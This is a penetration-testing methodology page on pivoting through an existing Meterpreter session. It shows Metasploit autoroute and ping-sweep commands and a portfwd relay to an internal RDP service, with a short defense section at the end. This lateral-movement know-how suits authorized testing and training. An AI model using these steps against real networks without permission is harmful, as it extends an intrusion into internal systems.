---
layout: page
title: "Meterpreter Pivoting"
subtitle: "Routing Metasploit modules and forwarding ports through an existing Meterpreter session"
permalink: /methodology/pivoting/meterpreter-pivoting/
---

A Meterpreter session on a pivot host can carry traffic for the rest of the Metasploit toolset. An autoroute entry sends traffic for an internal subnet through the session, and `portfwd` exposes one internal port on a local port of the attack host. Use this when the pivot already runs a Meterpreter session and a separate SSH tunnel is not needed.

## Workflow

1. From inside the session, list the pivot's interfaces and routes to find the internal networks it can reach.
2. Add an autoroute entry for the internal subnet through the session.
3. Sweep the subnet from the session to find live hosts. ICMP sweeps are fast but often blocked.
4. Forward a single service port with `portfwd` when one specific service is needed, such as RDP.
5. Remove routes and forwards when the work is finished.

```bash
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET INTERNAL_SUBNET
msf6 post(multi/manage/autoroute) > run
```

```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=INTERNAL_SUBNET
meterpreter > portfwd add -l 3300 -p 3389 -r TARGET_IP
[*] Local TCP relay created: :3300 <-> TARGET_IP:3389
```

Connect the client to the local end of the relay:

```bash
attacker$ xfreerdp /v:localhost:3300 /u:USERNAME /p:PASSWORD
```

## What to look for

- The autoroute post module reports the subnets it added. Confirm the internal range appears before running scans.
- A `portfwd` relay listens on the attack host only while the session is alive.
- If a sweep returns nothing, the target may still be up. Fall back to a TCP check against a known port.

## Pitfalls

- The older `run autoroute` script is deprecated. Use the post module shown above.
- Routes are tied to a session. If the session dies, the routes and relays go with it.
- Ping sweeps assume ICMP is allowed. Windows hosts block echo requests by default.

## Defense and prevention

Limit outbound connections from servers to the destinations they need, and monitor for unexpected Meterpreter callbacks and new listeners on internal hosts.
